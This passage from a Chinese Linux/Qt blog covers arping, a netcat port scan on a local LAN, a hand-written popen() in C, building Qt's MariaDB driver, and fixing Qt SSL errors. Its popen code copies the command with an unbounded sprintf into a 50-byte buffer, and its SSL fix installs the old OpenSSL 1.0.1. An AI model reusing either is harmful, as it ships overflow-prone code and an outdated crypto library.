class="hljs-number">50.00</span>%)<br>Nping done: <span class="hljs-number">2</span> IP addresses pinged <span class="hljs-keyword">in</span> <span class="hljs-number">4.09</span> seconds<br></code></pre></div></td></tr></table></figure>
<h3 id="arping"><a class="markdownIt-Anchor" href="#arping"></a> arping</h3>
<p>arping用在本地局域网中，判断目标主机是否在线</p>
<figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">Usage: arping [-fqbDUAV] [-c count] [-w timeout] [-I device] [-s source] destination<br>  -f : <span class="hljs-type">quit</span> on first reply<br>  -q : <span class="hljs-type">be</span> quiet<br>  -b : <span class="hljs-type">keep</span> broadcasting, don<span class="hljs-symbol">&#x27;t</span> go unicast<br>  -D : <span class="hljs-type">duplicate</span> address detection mode<br>  -U : <span class="hljs-type">Unsolicited</span> ARP mode, update your neighbours<br>  -A : <span class="hljs-type">ARP</span> answer mode, update your neighbours<br>  -V : <span class="hljs-type">print</span> version <span class="hljs-keyword">and</span> <span class="hljs-keyword">exit</span><br>  -c count : <span class="hljs-type">how</span> many packets to send<br>  -w timeout : <span class="hljs-type">how</span> long to wait <span class="hljs-keyword">for</span> a reply<br>  -I device : <span class="hljs-type">which</span> ethernet device to <span class="hljs-keyword">use</span><br>  -s source : <span class="hljs-type">source</span> ip address<br>  destination : <span class="hljs-type">ask</span> <span class="hljs-keyword">for</span> what ip address<br></code></pre></div></td></tr></table></figure>
<p>如下判断 192.168.1.110 主机是否在线</p>
<figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">&gt; arping -c <span class="hljs-number">2</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.110</span>  -w <span class="hljs-number">1</span><br>ARPING <span class="hljs-number">192.168</span>.<span class="hljs-number">1.110</span> <span class="hljs-selector-tag">from</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span> eth0<br>Unicast reply <span class="hljs-selector-tag">from</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.110</span> <span class="hljs-selector-attr">[24:05:0F:41:E3:87]</span>  <span class="hljs-number">61.513ms</span><br>Unicast reply <span class="hljs-selector-tag">from</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.110</span> <span class="hljs-selector-attr">[24:05:0F:41:E3:87]</span>  <span class="hljs-number">1.864ms</span><br>Sent <span class="hljs-number">2</span> probes (<span class="hljs-number">1</span> broadcast(s))<br>Received <span class="hljs-number">2</span> response(s)<br></code></pre></div></td></tr></table></figure>
<h3 id="netcat"><a class="markdownIt-Anchor" href="#netcat"></a> netcat</h3>
<p>对于netcat(nc)，我只想介绍其中一个功能——扫描主机端口</p>
<figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less">&gt; <span class="hljs-selector-tag">nc</span> <span class="hljs-selector-tag">-zvn</span> <span class="hljs-selector-tag">-w</span> <span class="hljs-selector-tag">1</span> <span class="hljs-selector-tag">192</span><span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.110</span>  <span class="hljs-selector-tag">1-5555</span><br>(UNKNOWN) <span class="hljs-selector-attr">[192.168.1.110]</span> <span class="hljs-selector-tag">3306</span> (mysql) <span class="hljs-selector-tag">open</span><br>(UNKNOWN) <span class="hljs-selector-attr">[192.168.1.110]</span> <span class="hljs-selector-tag">80</span> (http) <span class="hljs-selector-tag">open</span><br>(UNKNOWN) <span class="hljs-selector-attr">[192.168.1.110]</span> <span class="hljs-selector-tag">22</span> (ssh) <span class="hljs-selector-tag">open</span><br></code></pre></div></td></tr></table></figure>
<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
<p>以上是一些比较常用ping工具了，当然还有更强的的如nmap 😃</p>
<p>bye</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ping</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux popen()函数内部实现原理</title>
    <url>/linux-popen/</url>
    <content><![CDATA[<p>最近发现了一个函数 <strong>popen()/pclose()</strong> ,所以现在打算理清下思路…</p>
<span id="more"></span>
<h4 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h4>
<p>linux下的 <strong>popen</strong> 函数,大概就是通过 <strong>fork</strong> 一个子进程来执行命令并返回执行的结果给父进程.</p>
<blockquote>
<p>The popen() function shall <strong>execute the command</strong> specified by the string command. It shall <strong>create a pipe</strong> between the calling program and the executed command, and shall return a pointer to a stream that can be used to either read from or write to the pipe.</p>
<p><a href="http://pubs.opengroup.org/onlinepubs/009695399/functions/popen.html">http://pubs.opengroup.org/onlinepubs/009695399/functions/popen.html</a></p>
</blockquote>
<p>函数声明如下</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-comment">/* Create a new stream connected to a pipe running the given command.</span><br><span class="hljs-comment">   This function is a possible cancellation point and therefore not</span><br><span class="hljs-comment">   marked with __THROW.  */</span><br><span class="hljs-function"><span class="hljs-keyword">extern</span> FILE *<span class="hljs-title">popen</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *__command, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *__modes)</span> __wur</span>;<br><span class="hljs-comment">/* Close a stream opened by popen and return the status of its child.</span><br><span class="hljs-comment">   This function is a possible cancellation point and therefore not</span><br><span class="hljs-comment">   marked with __THROW.  */</span><br><span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> <span class="hljs-title">pclose</span> <span class="hljs-params">(FILE *__stream)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p>当然了,更重要的是要知道该函数内部是怎么实现的,大概步骤如下:<strong>(此处仅讨论子进程返回结果给父进程!)</strong></p>
<ol>
<li>父进程通过 <strong>pipe()</strong> 创建 <strong>读/写匿名管道</strong> ,并关闭写管道pfd[1]</li>
<li>然后 <strong>fork()</strong> 创建子进程</li>
<li>子进程 <strong>close()</strong> 读管道pfd[0]和标准输出(STDOUT_FILENO=1) ,并 <strong>dup()</strong> 写管道pfd[1]</li>
<li>子进程通过 <strong>execl()</strong> 执行命令,执行的结果为标准输出重定向到了写管道pfd[1]</li>
<li>父进程 <strong>wait()</strong> 子进程退出,接着 <strong>fdopen()</strong> 通过文件描述符返回一个 <strong>FILE*</strong> . 注意返回文件指针时,不能关闭读管道pfd[0],可以通过后续 fclose() 关闭该描述符</li>
<li><strong>fclose()</strong> 关闭该读管道pfd[0]</li>
</ol>
<p>简单实现代码如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">FILE* <span class="hljs-title">mypopen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*cmd)</span></span>&#123;<br>    <span class="hljs-comment">//管道文件描述符</span><br>    <span class="hljs-keyword">int</span> pfd[<span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">pipe</span>(pfd)!=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error: %s\n&quot;</span>,<span class="hljs-built_in">strerror</span>(errno));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-comment">//创建子进程</span><br>    <span class="hljs-keyword">pid_t</span>  pid=fork();<br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">close</span>(pfd[<span class="hljs-number">0</span>]);<br>        <br>         <span class="hljs-comment">//重定向 标准输出 到 写管道</span><br>        <span class="hljs-built_in">close</span>(STDOUT_FILENO);<br>        <span class="hljs-built_in">dup</span>(pfd[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">char</span> _cmd[<span class="hljs-number">50</span>]&#123;<span class="hljs-number">0</span>&#125;;<br>        <span class="hljs-built_in">sprintf</span>(_cmd,<span class="hljs-string">&quot;%s&quot;</span>,cmd);<br>        <span class="hljs-built_in">execl</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,_cmd,<span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">//关闭写管道</span><br>    <span class="hljs-built_in">close</span>(pfd[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">//等待子进程退出</span><br>    <span class="hljs-keyword">int</span> p= <span class="hljs-built_in">wait</span>(<span class="hljs-number">0</span>);<br>   <span class="hljs-comment">//printf(&quot;%d terminal\n&quot;,p);</span><br>    <span class="hljs-comment">//直接读取数据</span><br>    <span class="hljs-comment">//char buffer[1024*2]=&#123;0&#125;;</span><br>    <span class="hljs-comment">//read(pfd[0],buffer,1024*2);</span><br>    FILE* pfile =<span class="hljs-built_in">fdopen</span>(pfd[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!pfile) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> pfile;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    FILE *file= <span class="hljs-built_in">mypopen</span>(<span class="hljs-string">&quot;ls -lSah&quot;</span>);<br>    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fgets</span>(buffer,<span class="hljs-number">1024</span>,file))&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buffer);<br>    &#125;<br>    <span class="hljs-comment">//close pfd[0]!</span><br>    <span class="hljs-built_in">fclose</span>(file);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>其中,较重要的是在子进程中重定向标准输出,这里给出其他方法重定向标准输出到管道描述符</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//方法1</span><br><span class="hljs-comment">//重定向 标准输出 到 写管道</span><br><span class="hljs-built_in">close</span>(STDOUT_FILENO);<br><span class="hljs-built_in">dup</span>(pfd[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">//方法2,相当于先close(STDOUT_FILENO) ,再dup(pfd[1])</span><br><span class="hljs-built_in">dup2</span>(pfd[<span class="hljs-number">1</span>],STDOUT_FILENO);<br><span class="hljs-comment">//方法3</span><br><span class="hljs-built_in">close</span>(STDOUT_FILENO);<br><span class="hljs-keyword">int</span> fd=<span class="hljs-built_in">fcntl</span>(pfd[<span class="hljs-number">1</span>],F_DUPFD);<br></code></pre></div></td></tr></table></figure>
<h4 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h4>
<p>参考文章: <a href="http://blog.csdn.net/litingli/article/details/5891726">http://blog.csdn.net/litingli/article/details/5891726</a></p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt5.10.0编译MYSQL(Mariadb)驱动</title>
    <url>/linux-qt-com-mysql/</url>
    <content><![CDATA[<p>最近安装了新版本的Qt,当连接MySQL数据库时,又出现那个似曾相识的错误 <strong>QSqlDatabase: QMYSQL driver not loaded</strong>.知道后就赶紧去编译源码.然而你以为真的就那么一帆风顺吗?</p>
<span id="more"></span>
<h3 id="问题"><a class="markdownIt-Anchor" href="#问题"></a> 问题</h3>
<p>测试环境:</p>
<ul>
<li>Linux</li>
<li>Qt 5.10.0</li>
<li>MariaDB 10.1.29</li>
</ul>
<p>出现问题:<br />
我是新换成了MariaDB,比起之前传统MySQL,相应的文件路径也发生了变化.而其结果时导致后面一连串的问题.<br />
现在网上大部分都是以前的MySQL驱动编译教程,关于MariaDB数据库(本质上也是MySQL)的资料很少,所以这里就总结一下期间遇到的问题……</p>
<p>终端下输入: <code>$ locate mysql.h</code><br />
在我这里输出</p>
<blockquote>
<p><strong>/usr/include/mariadb/mysql.h</strong><br />
/usr/include/qt4/Qt/qsql_mysql.h<br />
/usr/include/qt4/QtSql/qsql_mysql.h</p>
</blockquote>
<p>注意了没,就这里注定编译MySQL驱动会失败!因为默认的搜索路径为 <strong>/usr/include/mysql.h</strong></p>
<p>接下来我们来看看 <strong><a href="http://libqsqlmysql.so">libqsqlmysql.so</a></strong> 这个库文件<br />
<code>$ ldd libqsqlmysql.so</code><br />
<img src="/uploads/images/linux/file_001_qt1.png" alt="img" /></p>
<p>他说 libqsqlmysql.so.18 这个库文件没有找到,那么就只能重新编译了…</p>
<h3 id="尝试成功"><a class="markdownIt-Anchor" href="#尝试成功"></a> 尝试成功</h3>
<p>但是这里我还是讲一下我第一次尝试的方法(就是把 <strong>mariadb</strong> 的库链接到 libqsqlmysql.so.18)</p>
<p><code>$ locate libmariadb|grep so</code> 查看 mariadb库文件的路径</p>
<blockquote>
<p>/usr/lib/x86_64-linux-gnu/libmariadb.so<br />
/usr/lib/x86_64-linux-gnu/libmariadb.so.2<br />
/usr/lib/x86_64-linux-gnu/libmariadbclient.so.18<br />
<strong>/usr/lib/x86_64-linux-gnu/libmariadbclient.so.18.0.0</strong></p>
</blockquote>
<p>接着我再找下是否还存在之前的 <strong><a href="http://libmysqlclient.so">libmysqlclient.so</a></strong><br />
<code>$ locate libmysqlclient.so</code></p>
<blockquote>
<p>/usr/lib/libmysqlclient.so</p>
</blockquote>
<p><code>$ ls -l /usr/lib/libmysqlclient.so</code> 发现 <a href="http://libmysqlclient.so">libmysqlclient.so</a> 是个软链接</p>
<blockquote>
<p>lrwxrwxrwx 1 root root 43 9月 17 08:01 /usr/lib/libmysqlclient.so -&gt; /usr/lib/x86_64-linux-gnu/libmysqlclient.so</p>
</blockquote>
<p>接着 <code>$ ls -l /usr/lib/x86_64-linux-gnu/libmysqlclient.so</code></p>
<blockquote>
<p>ls: 无法访问’/usr/lib/x86_64-linux-gnu/libmysqlclient.so’: 没有那个文件或目录</p>
</blockquote>
<p>what!居然不存在!?所以赶紧把那链接删了</p>
<p>那么接下来就是给 <strong><a href="http://libmariadbclient.so">libmariadbclient.so</a></strong> 设个软链接</p>
<blockquote>
<p>ln -s /usr/lib/x86_64-linux-gnu/libmariadbclient.so.18 /usr/lib/libmysqlclient.so<br />
<strong>ln -s /usr/lib/x86_64-linux-gnu/libmariadbclient.so.18 /usr/lib/libmysqlclient.so.18</strong></p>
</blockquote>
<p>最后看看 <code>$ ldd libqsqlmysql.so</code></p>
<blockquote>
<p>libmysqlclient.so.18 =&gt; /usr/lib/libmysqlclient.so.18 (0x00007fdf1a1df000)</p>
</blockquote>
<p>……居然成功了!!那还用编译个毛啊??然而这不是本文重点蛤……</p>
<h3 id="重点编译mysql驱动"><a class="markdownIt-Anchor" href="#重点编译mysql驱动"></a> 重点(编译MySQL驱动)</h3>
<p>这里所说的驱动其实也不过就是一个链接库罢了……</p>
<p>首先进入该源代码目录下 <code>$ cd $&#123;QTDIR&#125;/5.10.0/Src/qtbase/src/plugins/sqldrivers/mysql</code></p>
<p>一般正常来讲接下来就是 <code>qmake mysql.pro</code>,<code>make</code><br />
不过这里会出现一个错误<br />
<img src="/uploads/images/linux/file_002_qt2.png" alt="img" /></p>
<p>这就要修改 <strong><a href="http://mysql.pro">mysql.pro</a></strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">TARGET = qsqlmysql<br>HEADERS += $<span class="hljs-variable">$PWD</span>/qsql_mysql_p<span class="hljs-selector-class">.h</span><br>SOURCES += $<span class="hljs-variable">$PWD</span>/qsql_mysql<span class="hljs-selector-class">.cpp</span> $<span class="hljs-variable">$PWD</span>/<span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.cpp</span><br>QMAKE_USE += mysql<br>OTHER_FILES += mysql<span class="hljs-selector-class">.json</span><br>INCLUDEPATH += /usr/include/mariadb<br>PLUGIN_CLASS_NAME = QMYSQLDriverPlugin<br><span class="hljs-function"><span class="hljs-title">include</span><span class="hljs-params">(../qsqldriverbase.pri)</span></span><br></code></pre></div></td></tr></table></figure>
<p>注意我添加了 <strong>INCLUDEPATH += /usr/include/mariadb</strong></p>
<p>接着 <code>qmake;make</code> 恭喜,特么的又出现了个错误.不急找找看那出了问题…</p>
<blockquote>
<p>/opt/Qt5.10.0/5.10.0/gcc_64/bin/qmake -o Makefile <a href="http://mysql.pro">mysql.pro</a><br />
rm -f <a href="http://libqsqlmysql.so">libqsqlmysql.so</a><br />
g++ -Wl,–no-undefined -Wl,-O1 -Wl,–enable-new-dtags -Wl,-z,origin -Wl,-rpath,$ORIGIN/…/…/lib -Wl,-rpath,$ORIGIN/…/…/lib -shared -o <a href="http://libqsqlmysql.so">libqsqlmysql.so</a> .obj/qsql_mysql.o .obj/main.o .obj/moc_qsql_mysql_p.o -L/opt/Qt5.10.0/5.10.0/gcc_64/lib -lQt5Sql -lQt5Core <strong>-lmariadbclient</strong> -lpthread -lz -lm -ldl<br />
<strong>/usr/bin/ld: 找不到 -lmariadbclient</strong><br />
collect2: error: ld returned 1 exit status<br />
Makefile:80: recipe for target ‘…/plugins/sqldrivers/libqsqlmysql.so’ failed<br />
make: *** […/plugins/sqldrivers/libqsqlmysql.so] Error 1</p>
</blockquote>
<p>其实问题很简单,就是一个链接名字.在链接库时,默认匹配的为 <a href="http://libxxx.so">libxxx.so</a> ; 而后面的数字,如: <a href="http://libxxx.so">libxxx.so</a>.<strong>1.1.1</strong> 表示库的版本.</p>
<p><code>$ locate libmariadbclient.so</code> 看到,少了一个 <a href="http://libmariadbclient.so">libmariadbclient.so</a></p>
<blockquote>
<p>/usr/lib/x86_64-linux-gnu/libmariadbclient.so.18<br />
/usr/lib/x86_64-linux-gnu/libmariadbclient.so.18.0.0</p>
</blockquote>
<p>瞬间问题简单化了,so,直接添加一个软链接就行了</p>
<blockquote>
<p>ln -s /usr/lib/x86_64-linux-gnu/libmariadbclient.so.18.0.0 /usr/lib/x86_64-linux-gnu/<strong><a href="http://libmariadbclient.so">libmariadbclient.so</a></strong></p>
</blockquote>
<p>再一次 <code>qmake;make</code>……</p>
<blockquote>
<p>rm -f <a href="http://libqsqlmysql.so">libqsqlmysql.so</a><br />
g++ -Wl,–no-undefined -Wl,-O1 -Wl,–enable-new-dtags -Wl,-z,origin -Wl,-rpath,$ORIGIN/…/…/lib -Wl,-rpath,$ORIGIN/…/…/lib -shared -o <a href="http://libqsqlmysql.so">libqsqlmysql.so</a> .obj/qsql_mysql.o .obj/main.o .obj/moc_qsql_mysql_p.o -L/opt/Qt5.10.0/5.10.0/gcc_64/lib -lQt5Sql -lQt5Core -lmariadbclient -lpthread -lz -lm -ldl<br />
mv -f <a href="http://libqsqlmysql.so">libqsqlmysql.so</a> <strong>…/plugins/sqldrivers/</strong></p>
</blockquote>
<p>成功编译!</p>
<p>现在 <code>$ ../plugins/sqldrivers</code><br />
<code>$ ldd libqsqlmysql.so</code></p>
<blockquote>
<p><strong>libmariadbclient.so.18</strong> =&gt; /usr/lib/x86_64-linux-gnu/libmariadbclient.so.18 (0x00007f1bf7414000)</p>
</blockquote>
<p>现在可以把这个文件复制到 /opt/Qt5.10.0/5.10.0/gcc_64/plugins/sqldrivers 目录下了</p>
<h3 id="结束语"><a class="markdownIt-Anchor" href="#结束语"></a> 结束语</h3>
<p>基本上到此为止了吧……顺带提下,用C写的程序链接MySQL数据库时,传统的做法就是</p>
<blockquote>
<p>gcc xxx.c -o xxx <strong>-lmysqlclient</strong></p>
</blockquote>
<p>换成MariaDB后就成了</p>
<blockquote>
<p>gcc xxx.c -o xxx <strong>-lmariadb</strong></p>
</blockquote>
<p>这一点要特别注意啊!</p>
<p>bye</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Qt</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下Qt发生错误qt.network.ssl:QSslSocket:cannotresolve...</title>
    <url>/linux-qt-network-ssl/</url>
    <content><![CDATA[<p>在Linux上Qt使用network时出现错误:</p>
<blockquote>
<p>qt.network.ssl: QSslSocket: cannot resolve TLSv1_1_client_method<br />
qt.network.ssl: QSslSocket: cannot resolve TLSv1_2_client_method<br />
qt.network.ssl: QSslSocket: cannot resolve TLSv1_1_server_method<br />
qt.network.ssl: QSslSocket: cannot resolve TLSv1_2_server_method<br />
qt.network.ssl: QSslSocket: cannot resolve SSL_select_next_proto<br />
qt.network.ssl: QSslSocket: cannot resolve SSL_CTX_set_next_proto_select_cb<br />
qt.network.ssl: QSslSocket: cannot resolve SSL_get0_next_proto_negotiated<br />
qt.network.ssl: QSslSocket: cannot call unresolved function SSL_get0_next_proto_negotiated</p>
</blockquote>
<span id="more"></span>
<p>经网上查阅,大概知道了原因,就是要自己重新编译openssl.第一次用的是1.1版本的,发现还是解决不了,于是下了1.0.1的.<br />
<a href="https://www.openssl.org/source/old/1.0.1/">&gt;&gt;链接</a></p>
<blockquote>
<p>wget <a href="https://www.openssl.org/source/old/1.0.1/openssl-1.0.1.tar.gz">https://www.openssl.org/source/old/1.0.1/openssl-1.0.1.tar.gz</a><br />
tar zxvf openssl-1.0.1.tar.gz<br />
cd openssl-1.0.1/<br />
./config enable-shared<br />
make</p>
</blockquote>
<p>在 openssl-1.0.1 目录下生成了so文件,复制到Qt安装目录lib下</p>
<blockquote>
<p>cp <a href="http://libcrypto.so">libcrypto.so</a> libcrypto.so.1.0.0 <a href="http://libssl.so">libssl.so</a> libssl.so.1.0.0 /opt/Qt5.6.2/5.6/gcc_64/lib</p>
</blockquote>
<p>然后ok</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>创建Qt5应用程序插件</title>
    <url>/linux-qt-plugin/</url>
    <content><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3>
<p>最近也没时间来写博客了 (⊙o⊙)…，于是现在赶紧抽空写一写～～这次讲的是在创建Qt插件，<strong>在Windows上为.dll动态库，Linux上为.so动态库</strong></p>
<span id="more"></span>
<p><a href="http://doc.qt.io/qt-5/plugins-howto.html">官网&gt;&gt; How to Create Qt Plugins</a></p>
<p>大概就是这么几步</p>
<p><strong>Making an application extensible through plugins involves the following steps:</strong></p>
<ul>
<li>Define a set of interfaces (classes with only pure virtual functions) used to talk to the plugins.</li>
<li>Use the <code>Q_DECLARE_INTERFACE</code>() macro to tell Qt’s meta-object system about the interface.</li>
<li>Use <code>QPluginLoader</code> in the application to load the plugins.</li>
<li>Use qobject_cast() to test whether a plugin implements a given interface.</li>
</ul>
<p><strong>Writing a plugin involves these steps:</strong></p>
<ul>
<li>Declare a plugin class that inherits from QObject and from the interfaces that the plugin wants to provide.</li>
<li>Use the <code>Q_INTERFACES</code>() macro to tell Qt’s meta-object system about the interfaces.</li>
<li>Export the plugin using the Q_PLUGIN_METADATA() macro.</li>
<li>Build the plugin using a suitable .pro file.</li>
</ul>
<hr />
<p>**<font color=red>注意：</font>**Q_EXPORT_PLUGIN，Q_EXPORT_PLUGIN2 宏在Qt5不能用了，用新的宏 <strong>Q_PLUGIN_METADATA</strong>。</p>
<h3 id="生成插件"><a class="markdownIt-Anchor" href="#生成插件"></a> 生成插件</h3>
<p>创建一个应用程序插件，要先创建一个插件接口类（interface），它只能包含，再创建一个插件类，并继承自这个接口类。下面以一个简单的例子说明：)</p>
<p>（新建一个空的Qt项目）</p>
<p>mytestplugininterface.h <strong>接口类</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> MYTESTPLUGININTERFACE_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MYTESTPLUGININTERFACE_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QString&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QObject&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyTestPluginInterface</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">MyTestPluginInterface</span>()&#123;&#125;<br>    <span class="hljs-comment">//纯虚函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">helloworld</span><span class="hljs-params">(QString string)</span></span>=<span class="hljs-number">0</span>;<br>&#125;;<br><span class="hljs-comment">//第二个参数指定 唯一IID标识符，其实就是个字符串</span><br><span class="hljs-built_in">Q_DECLARE_INTERFACE</span>(MyTestPluginInterface,<span class="hljs-string">&quot;myplugin.example.my.com&quot;</span>)<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">// MYTESTPLUGININTERFACE_H</span></span><br></code></pre></div></td></tr></table></figure>
<p>mytestplugin.h <strong>插件类头文件</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> MYTESTPLUGIN_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MYTESTPLUGIN_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;mytestplugininterface.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QObject&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span 